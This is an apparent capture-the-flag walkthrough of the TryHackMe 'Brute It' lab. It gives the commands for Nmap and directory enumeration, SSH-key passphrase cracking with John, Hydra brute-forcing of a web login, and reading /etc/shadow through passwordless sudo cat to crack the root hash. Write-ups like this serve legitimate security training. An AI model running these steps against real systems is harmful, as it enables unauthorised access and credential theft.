TryHackMe: Brute It – Full Walkthrough
Introduction
Room: Brute It
Link: https://tryhackme.com/room/bruteit
Difficulty: Easy
Tags: Reverse shell, Privilege escalation, sudo vulnerability

Platform: TryHackMe

Difficulty: Easy

Tags: SSH, brute-force, hash cracking, privilege escalation, Linux

Description:
Brute It is a beginner-friendly CTF room that focuses on enumeration, brute-forcing credentials, and privilege escalation. The goal is to work from web enumeration to full root compromise, leveraging multiple attack vectors.

Table of Contents
1. Reconnaissance

2. Web & Directory Enumeration

3. Private SSH Key Discovery & Cracking

4. Web Panel Password Brute-Force

5. SSH Shell Access

6. Privilege Escalation

7. Capturing Flags

8. Tools Used

9. Key Screenshots

10. References

1. Reconnaissance
Nmap Scan
First, I ran an Nmap scan to identify open services and versions:

bash
Copy
Edit
nmap -A <target-ip>
Findings:

22/tcp – SSH

80/tcp – HTTP (Apache)



2. Web & Directory Enumeration
Used Dirbuster to uncover hidden directories:

bash
Copy
Edit
dirbuster -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
Results:

/admin – Likely admin panel

/admin/panel/id_rsa – Private SSH key found



Exploring /admin in the browser and checking the HTML source revealed a potential username for later use.

3. Private SSH Key Discovery & Cracking
Downloaded the private SSH key:

bash
Copy
Edit
wget http://<target-ip>/admin/panel/id_rsa -O id_rsa
Converted the key to a hash with ssh2john:

bash
Copy
Edit
ssh2john id_rsa > hash.txt
Cracked the passphrase with John:

bash
Copy
Edit
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

4. Web Panel Password Brute-Force
Used Hydra to brute-force the admin panel password:

bash
Copy
Edit
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form "/admin/:user=admin&pass=^PASS^:invalid" -f -V
Credentials Found:

Username: admin (from HTML source)

Password: xavier (via Hydra)

Logged into the admin panel and retrieved the web flag.


5. SSH Shell Access
Changed the SSH key permissions:

bash
Copy
Edit
chmod 600 id_rsa
Logged in as john using the cracked passphrase:

bash
Copy
Edit
ssh john@<target-ip> -i id_rsa
Captured the user flag in /home/john/user.txt.

6. Privilege Escalation
Enumerated sudo permissions:

bash
Copy
Edit
sudo -l
Finding:

User john can run cat as root without a password.

Read root’s hash from /etc/shadow:

bash
Copy
Edit
sudo cat /etc/shadow | grep root > root_hash.txt
Cracked the root hash with John:

bash
Copy
Edit
john root_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Logged in as root:

bash
Copy
Edit
su root
7. Capturing Flags
User Flag: Found in /home/john/user.txt

Root Flag: Found in /root/root.txt


8. Tools Used
Nmap – Service & version detection

Dirbuster – Directory enumeration

Hydra – Brute-forcing web logins

ssh2john / John the Ripper – SSH key passphrase & hash cracking

wget – File download

ssh – Remote shell access

sudo / cat – Privilege escalation

su – Root login

9. Key Screenshots
🔍 Nmap Scan

📂 Dirbuster Results

🔑 SSH Key Cracked

🔓 Admin Panel Login

💻 User Shell Access

🛡 Root Hash Cracked

🏁 Root Shell

10. References
TryHackMe: Brute It

GTFOBins – cat

rockyou.txt password list